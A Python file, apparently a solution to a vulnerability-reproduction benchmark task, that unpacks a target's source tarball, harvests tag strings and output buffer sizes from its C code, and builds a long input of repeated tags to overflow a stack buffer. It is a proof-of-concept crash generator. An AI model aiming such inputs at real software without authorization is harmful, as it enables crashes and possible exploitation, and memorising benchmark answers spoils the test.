import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that attempts to trigger a stack buffer overflow related to tag handling.
        """
        # Default tags and patterns to fall back on
        default_tags = [
            "<b>", "</b>",
            "<i>", "</i>",
            "<u>", "</u>",
            "<tag>", "</tag>",
            "[tag]", "{tag}",
            "<A>", "<B>",
            "<IMG>", "</IMG>",
            "<font>", "</font>",
            "<color>", "</color>",
            "<link>", "</link>",
            "<url>", "</url>",
        ]

        candidate_tag_names = set()
        candidate_tag_literals = set()
        candidate_outbuf_sizes = []

        # Try to extract and analyze the source tarball
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        # Extract all contents
                        tf.extractall(tmpdir)
                except Exception:
                    # If extraction fails, fall back to defaults
                    tags = default_tags
                else:
                    # Walk through extracted files to find C/C++ sources and headers
                    for root, _, files in os.walk(tmpdir):
                        for fname in files:
                            if not fname.lower().endswith(
                                (".c", ".h", ".cpp", ".hpp", ".cc", ".hh", ".cxx", ".hxx", ".txt")
                            ):
                                continue
                            fpath = os.path.join(root, fname)
                            try:
                                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                                    data = f.read()
                            except Exception:
                                continue

                            # 1) Look for tag-related literals near occurrences of "tag"
                            for m in re.finditer(r"\btag\w*\b", data, flags=re.IGNORECASE):
                                start = max(0, m.start() - 200)
                                end = min(len(data), m.end() + 200)
                                segment = data[start:end]
                                # Simple string literal extraction
                                for sm in re.finditer(r'"([^"\\]*(?:\\.[^"\\]*)*)"', segment):
                                    lit = sm.group(1)
                                    if not (0 < len(lit) <= 20):
                                        continue
                                    if all(c.isalnum() or c in "/_-"
                                           for c in lit):
                                        candidate_tag_names.add(lit)

                            # 2) Look for explicit tag-like patterns in the code/text
                            for m in re.finditer(r"<([A-Za-z0-9/_-]{1,20})>", data):
                                candidate_tag_literals.add(m.group(0))
                            for m in re.finditer(r"\[([A-Za-z0-9/_-]{1,20})\]", data):
                                candidate_tag_literals.add(m.group(0))
                            for m in re.finditer(r"\{([A-Za-z0-9/_-]{1,20})\}", data):
                                candidate_tag_literals.add(m.group(0))

                            # 3) Try to detect output buffer sizes for guidance
                            # Look for patterns like: char out[1024];
                            for m in re.finditer(
                                r"char\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]\s*;",
                                data,
                            ):
                                var_name = m.group(1)
                                size_str = m.group(2)
                                try:
                                    size_val = int(size_str)
                                except ValueError:
                                    continue
                                # Prefer variables that look like output buffers
                                if any(x in var_name.lower() for x in ("out", "output", "dst", "buf")):
                                    if 8 <= size_val <= 1000000:
                                        candidate_outbuf_sizes.append(size_val)

                    # Build final tag set
                    tags_set = set()
                    tags_set.update(candidate_tag_literals)
                    for name in candidate_tag_names:
                        # Add multiple wrapper forms to increase chance of matching
                        tags_set.add("<" + name + ">")
                        tags_set.add("</" + name + ">")
                        tags_set.add("<" + name + "/>")
                        tags_set.add("[" + name + "]")
                        tags_set.add("{" + name + "}")

                    # Ensure we always have some tags
                    tags_set.update(default_tags)
                    tags = list(tags_set)
        except Exception:
            # Any unexpected failure: fall back to defaults
            tags = default_tags

        if not tags:
            tags = default_tags

        # Decide on overall target PoC length.
        # Use detected output buffer size if present; otherwise use a safe large value.
        if candidate_outbuf_sizes:
            # Heuristic: large enough multiple of the largest suspected output buffer size
            max_out = max(candidate_outbuf_sizes)
            # Aim for at least 4x the largest out buffer, but cap to avoid enormous inputs
            target_len = max(8192, min(4 * max_out, 65536))
        else:
            # Fallback target length if we have no size hints
            target_len = 20000

        # Now build a long sequence of repeated tags to blow past any fixed-size output buffer.
        # We interleave multiple forms of tags to maximize chance of exercising tag-handling code.
        parts = []
        current_len = 0
        idx = 0
        if not tags:
            tags = default_tags

        # Deduplicate tags while preserving some order
        seen_tags = set()
        ordered_tags = []
        for t in tags:
            if t not in seen_tags:
                seen_tags.add(t)
                ordered_tags.append(t)

        # Ensure deterministic order
        ordered_tags.sort()

        if not ordered_tags:
            ordered_tags = default_tags

        # Build until we reach target length
        num_tags = len(ordered_tags)
        while current_len < target_len:
            t = ordered_tags[idx % num_tags]
            # Repeat each tag several times and add a neutral separator
            chunk = t * 3 + "X"
            parts.append(chunk)
            current_len += len(chunk)
            idx += 1

        poc_str = "".join(parts)

        # Append a newline to ensure proper line termination for fgets/line-based readers
        if not poc_str.endswith("\n"):
            poc_str += "\n"

        return poc_str.encode("utf-8", errors="ignore")
